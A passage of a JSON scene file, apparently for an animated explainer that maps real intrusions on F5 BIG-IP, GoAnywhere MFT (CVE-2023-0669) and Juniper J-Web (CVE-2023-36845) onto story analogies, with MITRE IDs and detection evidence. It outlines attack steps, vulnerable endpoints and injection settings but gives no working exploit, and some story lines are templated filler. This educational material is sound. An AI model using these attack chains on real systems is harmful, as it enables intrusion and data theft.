          "id": "net-f5-smuggle-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Senior supervisor badge",
          "subtitle": "Rogue administrator account with role=admin",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Book",
          "stageTag": "STEP 02 · SETUP",
          "title": "Staff roster book",
          "storyExcerpt": "Acting under that smuggled manager stamp, the back-office clerk opens the staff roster book and writes in a brand-new senior supervisor badge with full building and workshop keys, even though…",
          "technicalParallel": "When Tomcat processes the smuggled /tmui/Control/form request with SC_A_REMOTE_USER=admin, it communicates with the BIG-IP master control daemon (mcpd) to write the new administrator account into…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Key",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Senior supervisor badge",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses senior supervisor badge to advance toward workshop master key.",
          "technicalParallel": "Executing inside Tomcat under the forged REMOTE_USER=admin identity (which bypasses the outer Apache authentication filter entirely because the smuggled request was born behind the Apache gatekeeper…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Sign-in",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Missing front-desk sign-in",
          "storyExcerpt": "Behind the scenes, missing front-desk sign-in captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in /var/log/audit and /var/log/ltm (local appliance configuration audit trails): creation of a new user account with role=admin and shell=bash without a preceding interactive web login (a…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Proxy Mirror",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Back Office",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Smuggled Slip",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1136.001"
    },
    "step-3": {
      "scenarioId": "f5-bigip-request-smuggling",
      "sectionKey": "step-3",
      "sceneKind": "net-f5-smuggle-step-3",
      "stageBadge": "STEP #3 · EXECUTION",
      "title": "Executing Arbitrary root Commands via tmshCmd.jsp (util bash -c)",
      "storyCue": "Wearing the newly forged supervisor badge, the outsider walks directly to the engine-room command console and dispatches unrestricted maintenance directives across the entire traffic-routing building.",
      "technicalCue": "T1059.004 · EXECUTION — Using the newly created admin account (or directly via a smuggled tmshCmd.jsp request), the attacker runs tmsh run /util bash -c \"...\" (abusing the Traffic Management Shell’s built-in \"/util…",
      "storyMappings": [
        {
          "storyTerm": "Engine-room command console",
          "technicalTerm": "Management tmshCmd.jsp execution endpoint",
          "tone": "amber"
        },
        {
          "storyTerm": "Unrestricted maintenance directive",
          "technicalTerm": "Arbitrary root command via util bash -c",
          "tone": "sky"
        },
        {
          "storyTerm": "Building traffic hub",
          "technicalTerm": "Compromised enterprise load-balancer appliance",
          "tone": "rose"
        },
        {
          "storyTerm": "Shift audit ledger",
          "technicalTerm": "Control-plane audit log recording shell runs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-f5-smuggle-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Engine-room command console",
          "subtitle": "Management tmshCmd.jsp execution endpoint",
          "tone": "amber"
        },
        {
          "id": "net-f5-smuggle-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Unrestricted maintenance directive",
          "subtitle": "Arbitrary root command via util bash -c",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Entry Beat",
          "stageTag": "STEP 03 · SETUP",
          "title": "Engine-room command console",
          "storyExcerpt": "Wearing the newly forged supervisor badge, the outsider walks directly to the engine-room command console and dispatches unrestricted maintenance directives across the entire traffic-routing…",
          "technicalParallel": "Because an F5 BIG-IP sits at the front of the datacenter terminating TLS connections and load-balancing internal servers, root access on the appliance exposes both private TLS keys and direct network…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Hub",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Unrestricted maintenance directive",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses unrestricted maintenance directive to advance toward building traffic hub.",
          "technicalParallel": "Using the newly created admin account (or directly via a smuggled tmshCmd.jsp request), the attacker runs tmsh run /util bash -c \"...\" (abusing the Traffic Management Shell’s built-in \"/util bash\"…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Impact Beat",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Shift audit ledger",
          "storyExcerpt": "Behind the scenes, shift audit ledger captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in F5 K000137353 (/var/log/audit appliance command logs): mcpd / tmsh audit log entries showing run /util bash -c executed from tmui / tomcat (confirming that the web management interface…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Proxy Mirror",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Back Office",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Smuggled Slip",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.004"
    }
  },
  "fortra-goanywhere-mft-cve-2023-0669-cl0p": {
    "briefing": {
      "scenarioId": "fortra-goanywhere-mft-cve-2023-0669-cl0p",
      "sectionKey": "briefing",
      "sceneKind": "net-goanywhere-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "CL0P (TA505): Fortra GoAnywhere MFT LicenseServlet Deserialization RCE — Story-to-Technical Overview",
      "storyCue": "A shipping warehouse exposes its private license-renewal drop box to the street and seals every envelope with the same printed factory padlock key. An outsider wraps a spring-loaded package with that public factory key, drops it through the renewal slot, and watches the clerk automatically unpack it into full control of the shipping floor.",
      "technicalCue": "INITIAL ACCESS: ENCRYPTED BUNDLE POST TO /GOANYWHERE/LIC/ACCEPT (CVE-2023-0669) -> EXECUTION: COMMONSBEANUTILS1 GADGET DESERIALIZATION & SYSTEM SHELL -> EXFIL & IMPACT: TRUEBOT / COBALT STRIKE DEPLOYMENT & MFT VAULT EXFILTRATION",
      "storyMappings": [
        {
          "storyTerm": "Private license drop box",
          "technicalTerm": "Exposed GoAnywhere MFT admin console on port 8000/8001",
          "tone": "amber"
        },
        {
          "storyTerm": "Printed factory padlock key",
          "technicalTerm": "Hardcoded AES encryption key in License Response Handler",
          "tone": "sky"
        },
        {
          "storyTerm": "Spring-loaded package",
          "technicalTerm": "Serialized Java CommonsBeanutils1 gadget chain",
          "tone": "rose"
        },
        {
          "storyTerm": "Shipping floor archive",
          "technicalTerm": "Managed customer file transfer repositories",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-goanywhere-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Private license drop box",
          "subtitle": "Exposed GoAnywhere MFT admin console on port 8000/8001",
          "tone": "amber"
        },
        {
          "id": "net-goanywhere-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Printed factory padlock key",
          "subtitle": "Hardcoded AES encryption key in License Response Handler",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Drop Box",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "ENCRYPTED BUNDLE POST TO /GOANYWHERE/LIC/ACCEPT (CVE-2023-0669)",
          "storyExcerpt": "Because the warehouse reused one fixed factory padlock key across every branch, the outsider locks a custom-built trick package with that exact key and posts it straight into the street-facing license…",
          "technicalParallel": "Encrypting a serialized Java object does not provide authentication if the encryption key is hardcoded inside the client/server software binary itself.",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Key Onto",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "COMMONSBEANUTILS1 GADGET DESERIALIZATION & SYSTEM SHELL",
          "storyExcerpt": "The warehouse clerk unlocks the envelope with the matching factory key and dumps the contents directly onto the sorting table. As the parts click together automatically, the sorting machine fires up a…",
          "technicalParallel": "As Huntress discovered, when the gadget chain finishes executing its payload inside readObject(), it throws a java.lang.reflect.InvocationTargetException that GoAnywhere writes directly into…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Open Kit",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "TRUEBOT / COBALT STRIKE DEPLOYMENT & MFT VAULT EXFILTRATION",
          "storyExcerpt": "From the open terminal, the outsider installs a quiet scouting kit and remote courier relay in the shared storeroom, then packs out confidential partner shipping records. Continuing the same characters…",
          "technicalParallel": "By targeting Managed File Transfer (MFT) appliances like GoAnywhere and MOVEit, CL0P bypassed endpoint EDR on user laptops and went straight to the central server where organizations store unencrypted…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "License Box",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Transfer Safe",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Factory Key",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "fortra-goanywhere-mft-cve-2023-0669-cl0p",
      "sectionKey": "step-1",
      "sceneKind": "net-goanywhere-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Encrypting a Malicious Java Bundle with GoAnywhere’s Hardcoded \"$2\" AES Key (CVE-2023-0669)",
      "storyCue": "Because the warehouse reused one fixed factory padlock key across every branch, the outsider locks a custom-built trick package with that exact key and posts it straight into the street-facing license acceptance slot.",
      "technicalCue": "T1190 · INITIAL ACCESS — As reverse-engineered by Horizon3.ai, GoAnywhere MFT’s LicenseResponseServlet (mapped to /goanywhere/lic/accept and reachable without authentication) accepts a POST parameter named bundle.",
      "storyMappings": [
        {
          "storyTerm": "Fixed factory padlock key",
          "technicalTerm": "Hardcoded \"$2\" AES/CBC/PKCS5Padding key",
          "tone": "amber"
        },
        {
          "storyTerm": "Street-facing acceptance slot",
          "technicalTerm": "Unauthenticated POST /goanywhere/lic/accept endpoint",
          "tone": "sky"
        },
        {
          "storyTerm": "Custom-built trick package",
          "technicalTerm": "Encrypted serialized Java payload bundle",
          "tone": "rose"
        },
        {
          "storyTerm": "Branch perimeter monitor",
          "technicalTerm": "Network IDS signature monitoring port 8000/8001",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-goanywhere-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Fixed factory padlock key",
          "subtitle": "Hardcoded \"$2\" AES/CBC/PKCS5Padding key",
          "tone": "amber"
        },
        {
          "id": "net-goanywhere-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Street-facing acceptance slot",
          "subtitle": "Unauthenticated POST /goanywhere/lic/accept endpoint",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. One Key",
          "stageTag": "STEP 01 · SETUP",
          "title": "Fixed factory padlock key",
          "storyExcerpt": "Because the warehouse reused one fixed factory padlock key across every branch, the outsider locks a custom-built trick package with that exact key and posts it straight into the street-facing…",
          "technicalParallel": "Encrypting a serialized Java object does not provide authentication if the encryption key is hardcoded inside the client/server software binary itself.",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Slot",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Street-facing acceptance slot",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses street-facing acceptance slot to advance toward custom-built trick package.",
          "technicalParallel": "As reverse-engineered by Horizon3.ai, GoAnywhere MFT’s LicenseResponseServlet (mapped to /goanywhere/lic/accept and reachable without authentication) accepts a POST parameter named bundle.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. One Key",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Branch perimeter monitor",
          "storyExcerpt": "Behind the scenes, branch perimeter monitor captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Huntress and Suricata SID 2043881 (network alert rules for GoAnywhere MFT pre-auth exploitation): Unauthenticated POST /goanywhere/lic/accept requests on TCP port 8000/8001 (flagging…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "License Box",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Transfer Safe",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Factory Key",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "fortra-goanywhere-mft-cve-2023-0669-cl0p",
      "sectionKey": "step-2",
      "sceneKind": "net-goanywhere-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "Triggering the CommonsBeanutils1 Gadget Chain in ObjectInputStream.readObject()",
      "storyCue": "The warehouse clerk unlocks the envelope with the matching factory key and dumps the contents directly onto the sorting table. As the parts click together automatically, the sorting machine fires up a command terminal for the outsider.",
      "technicalCue": "T1059.003 · EXECUTION — After decrypting and Base64-decoding the bundle, LicenseTools.unserialize() passes the raw bytes into Java’s ObjectInputStream.readObject().",
      "storyMappings": [
        {
          "storyTerm": "Sorting table unpacker",
          "technicalTerm": "Java ObjectInputStream.readObject() deserializer",
          "tone": "amber"
        },
        {
          "storyTerm": "Self-clicking mechanical parts",
          "technicalTerm": "CommonsBeanutils1 BeanComparator gadget chain",
          "tone": "sky"
        },
        {
          "storyTerm": "Warehouse clerk process",
          "technicalTerm": "Service runtime tomcat9.exe",
          "tone": "rose"
        },
        {
          "storyTerm": "Fired-up command terminal",
          "technicalTerm": "Spawned cmd.exe child shell process",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-goanywhere-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Sorting table unpacker",
          "subtitle": "Java ObjectInputStream.readObject() deserializer",
          "tone": "amber"
        },
        {
          "id": "net-goanywhere-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Self-clicking mechanical parts",
          "subtitle": "CommonsBeanutils1 BeanComparator gadget chain",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Key Onto",
          "stageTag": "STEP 02 · SETUP",
          "title": "Sorting table unpacker",
          "storyExcerpt": "The warehouse clerk unlocks the envelope with the matching factory key and dumps the contents directly onto the sorting table.",
          "technicalParallel": "As Huntress discovered, when the gadget chain finishes executing its payload inside readObject(), it throws a java.lang.reflect.InvocationTargetException that GoAnywhere writes directly into…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Self-clicking",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Self-clicking mechanical parts",
          "storyExcerpt": "As the parts click together automatically, the sorting machine fires up a command terminal for the outsider.",
          "technicalParallel": "After decrypting and Base64-decoding the bundle, LicenseTools.unserialize() passes the raw bytes into Java’s ObjectInputStream.readObject().",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Fired-up command terminal",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across fired-up command terminal while locking down warehouse clerk process.",
          "technicalParallel": "Documented by Huntress (application stack traces and process lineage for CVE-2023-0669): BeanComparator.compare and PriorityQueue.readObject stack trace in userdata/logs/goanywhere.log paired with…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "License Box",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Transfer Safe",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Factory Key",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.003"
    },
    "step-3": {
      "scenarioId": "fortra-goanywhere-mft-cve-2023-0669-cl0p",
      "sectionKey": "step-3",
      "sceneKind": "net-goanywhere-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Deploying TrueBot (acl.dll), Cobalt Strike & Exfiltrating MFT Customer Repositories",
      "storyCue": "From the open terminal, the outsider installs a quiet scouting kit and remote courier relay in the shared storeroom, then packs out confidential partner shipping records. Continuing the same characters and room from the previous beat, the operator performs two more concrete physical movements that an animator can stage without guessing, and each newly introduced prop has one explicit job.",
      "technicalCue": "T1219 · EXFIL & IMPACT — As documented by Mandiant (FIN11 / TA505) and Huntress, the initial PowerShell stager downloads and executes TrueBot (also tracked as Silence.Downloader, launched via rundll32.exe…",
      "storyMappings": [
        {
          "storyTerm": "Quiet scouting kit",
          "technicalTerm": "TrueBot (acl.dll) reconnaissance library",
          "tone": "amber"
        },
        {
          "storyTerm": "Remote courier relay",
          "technicalTerm": "Cobalt Strike post-exploitation beacon",
          "tone": "sky"
        },
        {
          "storyTerm": "Shared storeroom folder",
          "technicalTerm": "C:\\ProgramData\\ payload staging directory",
          "tone": "rose"
        },
        {
          "storyTerm": "Partner shipping records",
          "technicalTerm": "Exfiltrated MFT customer archives",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-goanywhere-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Quiet scouting kit",
          "subtitle": "TrueBot (acl.dll) reconnaissance library",
          "tone": "amber"
        },
        {
          "id": "net-goanywhere-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Remote courier relay",
          "subtitle": "Cobalt Strike post-exploitation beacon",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Open Kit",
          "stageTag": "STEP 03 · SETUP",
          "title": "Quiet scouting kit",
          "storyExcerpt": "From the open terminal, the outsider installs a quiet scouting kit and remote courier relay in the shared storeroom, then packs out confidential partner shipping records.",
          "technicalParallel": "By targeting Managed File Transfer (MFT) appliances like GoAnywhere and MOVEit, CL0P bypassed endpoint EDR on user laptops and went straight to the central server where organizations store unencrypted…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Same Room",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Remote courier relay",
          "storyExcerpt": "Continuing the same characters and room from the previous beat, the operator performs two more concrete physical movements that an animator can stage without guessing, and each newly introduced…",
          "technicalParallel": "As documented by Mandiant (FIN11 / TA505) and Huntress, the initial PowerShell stager downloads and executes TrueBot (also tracked as Silence.Downloader, launched via rundll32.exe…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Partner shipping records",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across partner shipping records while locking down shared storeroom folder.",
          "technicalParallel": "Documented by Mandiant and CISA (post-exploitation process chain for CL0P MFT intrusions): tomcat9.exe -> cmd.exe -> powershell.exe -> rundll32.exe loading unsigned DLLs from C:\\ProgramData\\…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "License Box",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Transfer Safe",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Factory Key",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1219"
    },
    "memory-forensics": {
      "scenarioId": "fortra-goanywhere-mft-cve-2023-0669-cl0p",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-goanywhere-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "CL0P (TA505): Fortra GoAnywhere MFT LicenseServlet Deserialization RCE — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of license box beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: rundll32.exe (TrueBot / Cobalt Strike) (TemplatesImpl Translet + TrueBot / Beacon [RWX])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of rundll32.exe (TrueBot / Cobalt Strike)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x0000021C40800000 (RWX, 284 KB) · TemplatesImpl Translet + TrueBot / Beacon",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against rundll32.exe (TrueBot / Cobalt Strike) (PID 7812)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "In-memory Java Translet bytecode from CommonsBeanutils1 spawning TrueBot and Cobalt Strike Beacon.",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-goanywhere-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of rundll32.exe…",
          "tone": "sky"
        },
        {
          "id": "net-goanywhere-memory-xray-right",
          "tag": "LIVE MEMORY · RWX",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x0000021C40800000 (RWX, 284 KB) · TemplatesImpl Translet +…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline rundll32.exe (TrueBot / Cobalt Strike) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x0000021C40800000 (RWX, 284 KB) containing TemplatesImpl Translet + TrueBot / Beacon.",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 7812 confirms injected region: In-memory Java Translet bytecode from CommonsBeanutils1 spawning TrueBot and Cobalt Strike Beacon.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "juniper-junos-jweb-cve-2023-36845-chain": {
    "briefing": {
      "scenarioId": "juniper-junos-jweb-cve-2023-36845-chain",
      "sectionKey": "briefing",
      "sceneKind": "net-juniper-jweb-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Juniper Junos OS J-Web: PHPRC \"/dev/fd/0\" Fileless Pre-Auth RCE — Story-to-Technical Overview",
      "storyCue": "A router administration booth lets visitors hand in environment preference slips before the booth clerk reads their own rulebook. An outsider points the rulebook address at the live letter slot itself, feeds custom settings straight through the slot, and runs in-memory commands to copy the entire router blueprint without writing a single file to disk.",
      "technicalCue": "INITIAL ACCESS: MANIPULATING THE \"PHPRC\" ENVIRONMENT VARIABLE VIA J-WEB (CVE-2023-36845) -> DEFENSE EVASION: INJECTING AUTO_PREPEND_FILE=\"DATA://...\" IN THE HTTP POST BODY -> EXECUTION: FILELESS IN-MEMORY PHP EXECUTION & JUNOS CONFIG EXTRACTION",
      "storyMappings": [
        {
          "storyTerm": "Router administration booth",
          "technicalTerm": "Juniper Junos OS J-Web management interface",
          "tone": "amber"
        },
        {
          "storyTerm": "Redirected rulebook slip",
          "technicalTerm": "Unauthenticated PHPRC=/dev/fd/0 setting (CVE-2023-36845)",
          "tone": "sky"
        },
        {
          "storyTerm": "Custom slot rule settings",
          "technicalTerm": "allow_url_include and auto_prepend_file runtime directives",
          "tone": "rose"
        },
        {
          "storyTerm": "Copied router blueprint",
          "technicalTerm": "Exfiltrated /config/juniper.conf device configuration",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-juniper-jweb-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Router administration booth",
          "subtitle": "Juniper Junos OS J-Web management interface",
          "tone": "amber"
        },
        {
          "id": "net-juniper-jweb-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Redirected rulebook slip",
          "subtitle": "Unauthenticated PHPRC=/dev/fd/0 setting (CVE-2023-36845)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Form",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "MANIPULATING THE \"PHPRC\" ENVIRONMENT VARIABLE VIA J-WEB (CVE-2023-36845)",
          "storyExcerpt": "An outsider mails an unauthenticated form to the booth clerk with an environment override instructing the clerk to read their configuration rules directly from the incoming mail envelope instead of the…",
          "technicalParallel": "Compare the two multi-source approaches: watchTowr Labs first demonstrated a 2-step chain (uploading a file via CVE-2023-36846 and pointing PHPRC to that uploaded file), whereas VulnCheck showed that…",
